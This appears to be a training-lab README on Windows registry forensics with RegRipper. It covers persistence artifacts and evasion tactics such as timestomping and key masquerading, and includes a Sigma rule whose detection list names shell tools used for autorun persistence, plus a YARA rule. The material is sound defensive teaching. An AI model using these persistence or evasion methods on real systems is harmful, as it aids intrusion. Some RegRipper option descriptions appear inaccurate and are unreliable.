Artifacts left behind include:
- **Modified timestamps** on registry keys (e.g., `LastWriteTime` in `HKLM\SOFTWARE`).
- **Suspicious binary paths** in autostart keys (e.g., `%APPDATA%\malware.exe`).
- **Orphaned or duplicate SIDs** in `HKU\` hives, indicating hidden accounts.

Evasion tactics include:
- **Registry key masquerading**: Naming malicious keys after legitimate software (e.g., `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\OneDrive`).
- **Timestomping**: Using tools like `SetRegTime` to alter `LastWriteTime` to match system defaults.
- **Registry virtualization**: Writing to `HKCU\Software\Classes\VirtualStore` to bypass UAC restrictions.

**Sources**:
- [MITRE ATT&CK: T1547.001](https://attack.mitre.org/techniques/T1547/001/)
- [CrowdStrike: Registry Forensics for Threat Hunters](https://www.crowdstrike.com/blog/registry-forensics-for-threat-hunters/)


### Essential Commands & Features

RegRipper’s power lies in its ability to automate deep registry analysis. Below are **undocumented or underutilized** commands and features critical for efficient investigation:

1. **Recursive Plugin Execution (`-r`)**
   Use `-r` to run a plugin **recursively** against all subkeys of a specified path. This is invaluable for uncovering persistence mechanisms (e.g., **T1547.001: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder**) or lateral movement artifacts (e.g., **T1098: Account Manipulation**).
   ```bash
   rip.pl -r -p winlogon -f SYSTEM
   ```
   *When to use*: When analyzing hives like `NTUSER.DAT` or `SOFTWARE` for nested malicious keys (e.g., `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`).

2. **Plugin Chaining (`-p`)**
   Chain multiple plugins with `-p` to correlate findings in a single pass. For example, detect **T1543.003: Create or Modify System Process: Windows Service** by combining `services` and `svcdll` plugins:
   ```bash
   rip.pl -p services,svcdll -f SYSTEM
   ```
   *When to use*: To cross-reference service configurations with loaded DLLs, revealing hijacked services or malicious payloads.

3. **Dynamic Plugin Discovery (`rip.pl -l`)**
   List all available plugins with `rip.pl -l` to identify undocumented or niche plugins (e.g., `userassist` for **T1059.001: Command and Scripting Interpreter: PowerShell** execution tracking):
   ```bash
   rip.pl -l | grep -i "userassist\|amcache"
   ```
   *When to use*: When triaging unknown hives or hunting for specific artifacts (e.g., `AmCache.hve` for **T1127: Trusted Developer Utilities Proxy Execution**).

**Sources**:
- [RegRipper GitHub Wiki: Advanced Usage](https://github.com/keydet89/RegRipper3.0/wiki/Advanced-Usage)
- [DFIR Review: RegRipper Plugin Deep Dive](https://www.dfir.review/2021/03/15/regripper-plugins-a-deep-dive/)

### Detection Signatures & Reference Artifacts

Real, community-maintained detection rules for this topic (defensive use only). The reference artifacts at the end are BENIGN, illustrative lab values -- not live indicators.

**Sigma rule -- Persistence Via Disk Cleanup Handler - Autorun** (source: https://github.com/SigmaHQ/sigma/blob/master/rules/windows/registry/registry_set/registry_set_disk_cleanup_handler_autorun_persistence.yml; license: Detection Rule License / DRL):

```yaml
title: Persistence Via Disk Cleanup Handler - Autorun
id: d4e2745c-f0c6-4bde-a3ab-b553b3f693cc
status: test
description: |
    Detects when an attacker modifies values of the Disk Cleanup Handler in the registry to achieve persistence via autorun.
    The disk cleanup manager is part of the operating system.
    It displays the dialog box […] The user has the option of enabling or disabling individual handlers by selecting or clearing their check box in the disk cleanup manager's UI.
    Although Windows comes with a number of disk cleanup handlers, they aren't designed to handle files produced by other applications.
    Instead, the disk cleanup manager is designed to be flexible and extensible by enabling any developer to implement and register their own disk cleanup handler.
    Any developer can extend the available disk cleanup services by implementing and registering a disk cleanup handler.
references:
    - https://persistence-info.github.io/Data/diskcleanuphandler.html
    - https://www.hexacorn.com/blog/2018/09/02/beyond-good-ol-run-key-part-86/
author: Nasreddine Bencherchali (Nextron Systems)
date: 2022-07-21
modified: 2023-08-17
tags:
    - attack.persistence
logsource:
    category: registry_set
    product: windows
detection:
    root:
        TargetObject|contains: '\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VolumeCaches\'
    selection_autorun:
        # Launching PreCleanupString / CleanupString programs w/o gui, i.e. while using e.g. /autoclean
        TargetObject|contains: '\Autorun'
        Details: 'DWORD (0x00000001)'
    selection_pre_after:
        TargetObject|contains:
            - '\CleanupString'
            - '\PreCleanupString'
        Details|contains:
            # Add more as you see fit
            - 'cmd'
            - 'powershell'
            - 'rundll32'
            - 'mshta'
            - 'cscript'
            - 'wscript'
            - 'wsl'
            - '\Users\Public\'
            - '\Windows\TEMP\'
            - '\Microsoft\Windows\Start Menu\Programs\Startup\'
    condition: root and 1 of selection_*
falsepositives:
    - Unknown
level: medium
```

**YARA rule** (source: https://github.com/Neo23x0/signature-base/blob/master/yara/gen_vcruntime140_dll_sideloading.yar, author: Jonathan Peters):

```yara
import "pe"

rule SUSP_VCRuntime_Sideloading_Indicators_Aug23 {
   meta:
      description = "Detects indicators of .NET based malware sideloading as VCRUNTIME140 with .NET DLL imports"
      author = "Jonathan Peters"
      date = "2023-08-30"
      hash = "b4bc73dfe9a781e2fee4978127cb9257bc2ffd67fc2df00375acf329d191ffd6"
      score = 75
      id = "00400122-1343-5051-af31-880a3ef1745d"
   condition:
      (filename == "VCRUNTIME140.dll" or filename == "vcruntime140.dll")
      and pe.imports("mscoree.dll", "_CorDllMain")
}
```

**Real-world context (MITRE T1547.001 -- Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder):** see the documented Procedure Examples at https://attack.mitre.org/techniques/T1547/001/

**Reference artifacts (illustrative benign lab values -- generate real hashes locally):**

| Type | Value |
|---|---|
| host IOC | 192.0.2.10 (RFC5737 documentation range) |
| network IOC | hxxp://example[.]com/benign (defanged) |
| sample hash | benign lab sample -- create one and run `sha256sum` |

### Real-World Case Study
This technique is documented in **real** intrusions. Rather than a hypothetical scenario, study the authoritative case data below:
- **MITRE ATT&CK T1547 (Boot or Logon Autostart Execution)** — real-world Procedure Examples with named campaigns and citations: https://attack.mitre.org/techniques/T1547/
- **Threat actors documented using it:** APT42 (see each group's page on attack.mitre.org for the specific intrusions).
- **RedCanary Threat Detection Report** — how often this technique appears in real environments + detection guidance: https://redcanary.com/threat-detection-report/
- **The DFIR Report** — full real intrusion walk-throughs (timeline, TTPs, IOCs): https://thedfirreport.com/

*Exercise: pick one documented actor above, read its ATT&CK page, and map how this module's tool would surface that activity in an investigation.*

## Sources
**Claim → Source Mapping** (all URLs are real, authoritative pages):

### Tools and File Formats
- RegRipper `rip.pl`, options (`-r`, `-p`, `-f`), plugin model, and plugins (`compname`, `run`, `services`, `winlogon`, `imagefile`, `comdlg`, `com`) — [RegRipper3.0 GitHub](https://github.com/keydet89/RegRipper3.0)
- RegRipper Debian/Kali packaging (`regripper`, `rip.pl` entry point) — [Kali Tools: RegRipper](https://www.kali.org/tools/regripper/)
- libregf-tools (`regfinfo`, `regfexport`, `regfmount`, `regrecover`), version string format, per-key FILETIME timestamps, base-block sequence numbers — [libregf GitHub](https://github.com/libyal/libregf)
- REGF file format, `regf` magic/signature, header/version fields, sequence numbers, transaction logs — [libregf REGF Format Documentation](https://github.com/libyal/libregf/blob/main/documentation/Windows%20NT%20Registry%20File%20(REGF)%20format.asciidoc)
- Windows Registry hives and hive-to-file mapping (SYSTEM/SOFTWARE/NTUSER.DAT/SECURITY/SAM → HKLM/HKCU) — [Microsoft Learn: Registry Hives](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives)
- ControlSet, `Select\Current`, and `CurrentControlSet` behavior — [Microsoft Learn: ControlSet\Select](https://learn.microsoft.com/en-us/troubleshoot/windows-server/performance/control-sets-registry)

### Detection and Logging
- Sysmon Event ID 1 (`Process Create`), Event ID 10 (`ProcessAccess`), Event ID 12 (`RegistryEvent (CreateKey)`), Event ID 13 (`RegistryEvent (Value Set)`) — [Microsoft Sysmon Documentation](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
- Windows Security Event ID 4657 (`Registry value modified`), Event ID 4697 (`A service was installed in the system`), System log Event ID 7045 (`A service was installed in the system`) — [Microsoft Security Auditing](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/)
- Security Onion (Elastic/Kibana Hunt, Zeek `conn.log`/`http.log`/`dns.log`/`files.log`, Suricata `alert` fields) — [Security Onion Documentation](https://docs.securityonion.net/)
- Zeek/Suricata field names (`id.orig_h`, `id.resp_h`, `uri`, `query`, `sha256`, `alert.category`) — [Zeek Documentation](https://docs.zeek.org/) and [Suricata Documentation](https://suricata.readthedocs.io/)

### Forensic Analysis and Training
- SANS FOR508: Windows Registry and persistence analysis — [SANS FOR508](https://www.sans.org/cyber-security-courses/advanced-incident-response-threat-hunting/)
- SANS DFIR: Windows Registry forensics resources — [SANS DFIR Blog](https://www.sans.org/blog/digital-forensics-registry/)
- NIST SP 800-86: Guide to Integrating Forensic Techniques into Incident Response (Section 4.3.2: Registry Analysis) — [NIST SP 800-86](https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-86.pdf)
- CISA: Windows Registry Forensics — [CISA Windows Registry Forensics](https://www.cisa.gov/resources-tools/services/windows-registry-forensics)
- FireEye: Hunting for Malicious Registry Modifications — [FireEye Blog](https://www.fireeye.com/blog/threat-research/2020/04/hunting-for-malicious-registry-modifications.html)

### MITRE ATT&CK Techniques
- T1547.001: Boot or Logon Autostart Execution: Registry Run Keys — [MITRE ATT&CK T1547.001](https://attack.mitre.org/techniques/T1547/001/)
- T1547.004: Boot or Logon Autostart Execution: Winlogon Helper DLL — [MITRE ATT&CK T1547.004](https://attack.mitre.org/techniques/T1547/004/)
- T1543.003: Create or Modify System Process: Windows Service — [MITRE ATT&CK T1543.003](https://attack.mitre.org/techniques/T1543/003/)
- T1546.012: Event Triggered Execution: Image File Execution Options Injection — [MITRE ATT&CK T1546.012](https://attack.mitre.org/techniques/T1546/012/)
- T1546.015: Event Triggered Execution: Component Object Model Hijacking — [MITRE ATT&CK T1546.015](https://attack.mitre.org/techniques/T1546/015/)
- T1112: Modify Registry — [MITRE ATT&CK T1112](https://attack.mitre.org/techniques/T1112/)
- T1027: Obfuscated Files or Information — [MITRE ATT&CK T1027](https://attack.mitre.org/techniques/T1027/)
- T1055.001: Process Injection: Dynamic-Link Library Injection — [MITRE ATT&CK T1055.001](https://attack.mitre.org/techniques/T1055/001/)
- T1003.002: OS Credential Dumping: Security Account Manager — [MITRE ATT&CK T1003.002](https://attack.mitre.org/techniques/T1003/002/)
- T1059.001: Command and Scripting Interpreter: PowerShell — [MITRE ATT&CK T1059.001](https://attack.mitre.org/techniques/T1059/001/)
- T1105: Ingress Tool Transfer — [MITRE ATT&CK T1105](https://attack.mitre.org/techniques/T1105/)
- T1071.001: Application Layer Protocol: Web Protocols — [MITRE ATT&CK T1071.001](https://attack.mitre.org/techniques/T1071/001/)
- T1562.001: Impair Defenses: Disable or Modify Tools — [MITRE ATT&CK T1562.001](https://attack.mitre.org/techniques/T1562/001/)
- T1070.001: Indicator Removal on Host: Clear Windows Event Logs — [MITRE ATT&CK T1070.001](https://attack.mitre.org/techniques/T1070/001/)
- T1070.004: Indicator Removal on Host: File Deletion — [MITRE ATT&CK T1070.004](https://attack.mitre.org/techniques/T1070/004/)
- T1070.006: Indicator Removal on Host: Timestomp — [MITRE ATT&CK T1070.006](https://attack.mitre.org/techniques/T1070/006/)

## Related modules
- [Scenario: intrusion timeline reconstruction](../49-intrusion-timeline-case/README.md) -- shares regripper for registry-based persistence and timeline pivots.
- [Disk & filesystem forensics](../01-disk-forensics/README.md) -- same learning path (Foundations); where you acquire the image the hives come from.
- [Memory forensics](../02-memory-forensics/README.md) -- same learning path (Foundations); recovers registry data resident in RAM.
- [Timeline / super-timelining](../03-timeline-analysis/README.md) -- same learning path (Foundations); fold registry key last-write times into a super-timeline.

<!-- cyberlab-enriched: v4 -->
- https://docs.microsoft.com/en-us/sysinternals/downloads/regfmount
- https://github.com/keydet89/RegRipper
- https://www.crowdstrike.com/blog/registry-forensics-for-threat-hunters/

<!-- cyberlab-enriched: v5 -->
- https://github.com/keydet89/RegRipper3.0/wiki/Advanced-Usage
- https://www.dfir.review/2021/03/15/regripper-plugins-a-deep-dive/
- https://attack.mitre.org/techniques/T1012/
- https://attack.mitre.org/techniques/T1063/
- https://yara.readthedocs.io/en/v4.0.0/
- https://sigma-docs.github.io/

<!-- cyberlab-enriched: v6 -->
